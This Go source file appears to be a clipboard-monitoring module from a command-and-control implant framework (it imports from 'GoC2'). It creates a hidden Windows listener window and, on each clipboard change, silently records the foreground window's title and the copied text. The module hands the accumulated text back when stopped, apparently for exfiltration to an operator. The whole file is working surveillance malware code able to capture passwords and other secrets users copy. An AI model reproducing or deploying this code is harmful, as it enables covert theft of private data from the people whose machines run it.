package clipboardmonitor

import (
	"fmt"
	"log"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"github.com/latortuga71/GoC2/pkg/winapi"
	"golang.org/x/sys/windows"
)

func WindowsProc(hwnd syscall.Handle, msg uint32, wparam, lparam uintptr) uintptr {
	switch msg {
	case 0x0002:
		log.Println("Destroying window")
		res := winapi.RemoveClipboardFormatListener(uintptr(hwnd))
		if res == 0 {
			log.Println("Failed to destroy window")
			return 0
		}
	case 0x001:
		log.Println("window created")
		res := winapi.AddClipboardFormatListener(uintptr(hwnd))
		if res == 0 {
			log.Println("failed to add listener")
			return 0
		}
	case 0x031D:
		log.Println("Clipboard updated.")
		hfgWindow := winapi.GetForegroundWindow()
		if hfgWindow == 0 {
			log.Println("failed to get foreground window")
			return 0
		}
		textLength := winapi.GetWindowTextLengthW(uintptr(hfgWindow))
		if textLength == 0 {
			log.Println("failed to get text length")
		}
		log.Println(textLength)
		buffer := make([]uint16, textLength+1)
		read := winapi.GetWindowText(uintptr(hfgWindow), uintptr(unsafe.Pointer(&buffer[0])), int(textLength+1))
		if !read {
			log.Println("Unknown Window")
		}
		windowTitle := syscall.UTF16ToString(buffer)
		// read data from clipboard.
		winapi.OpenClipboard(uintptr(0))
		res, _, _ := winapi.PIsClipboardFormatAvailable.Call(uintptr(1)) // CF_TEXT = 1
		if res == 0 {
			winapi.CloseClipboard()
			break
		}
		hData, _, _ := winapi.PGetClipboardData.Call(uintptr(13))
		winapi.CloseClipboard()
		if hData == 0 {
			log.Println("idk")
		}
		clipData := windows.UTF16PtrToString((*uint16)(unsafe.Pointer(hData)))
		GlobalClipData.AppendToString(fmt.Sprintf("Window Title : %s\nClipData: %s\n", windowTitle, clipData))
	default:
		ret := winapi.DefWindowProc(hwnd, msg, wparam, lparam)
		return ret
	}
	return 0
}

var GlobalClipData *LockedString = &LockedString{}

type LockedString struct {
	sync.Mutex
	DataString string
}

func (l *LockedString) AppendToString(data string) {
	l.Lock()
	l.DataString += data
	l.Unlock()
}

func (l *LockedString) ClearData() {
	l.Lock()
	l.DataString = ""
	l.Unlock()
}

func (l *LockedString) GetData() string {
	l.Lock()
	tmp := l.DataString
	l.Unlock()
	return tmp
}

var StopService bool = false
var WindowHandle syscall.Handle = 0

func StartClipboardMonitor() {
	className := "clipboardListener"
	instance, err := winapi.GetModuleHandle()
	if err != nil {
		log.Println(err)
		return
	}
	wcx := winapi.WNDCLASSEXW{
		WndProc:   syscall.NewCallback(WindowsProc),
		Instance:  instance,
		ClassName: syscall.StringToUTF16Ptr(className),
	}
	wcx.Size = uint32(unsafe.Sizeof(wcx))
	if _, err = winapi.RegisterClassEx(&wcx); err != nil {
		log.Println(err)
		return
	}
	WindowHandle, err = winapi.CreateWindow(
		className,
		"Test Window",
		0,
		0,
		0,
		0,
		0,
		0,
		0,
		instance,
	)
	if err != nil {
		log.Println(err)
		return
	}
	for {
		msg := winapi.MSG{}
		gotMessage, err := winapi.GetMessage(&msg, 0, 0, 0)
		if err != nil {
			log.Println(err)
			return
		}
		if gotMessage {
			winapi.TranslateMessage(&msg)
			winapi.DispatchMessage(&msg)
		} else {
			log.Println("Exiting window loop")
			break
		}
	}
	log.Println("clipboard service dead")
}

func StopClipboardMonitor() (string, error) {
	log.Println("Sending stop signal")
	winapi.SendMessage(uintptr(WindowHandle), uintptr(0x0002), uintptr(0), uintptr(0))
	WindowHandle = 0
	output := GlobalClipData.GetData()
	GlobalClipData.ClearData()
	time.Sleep(time.Second * 5)
	log.Println("stoooppp")
	return output, nil
}
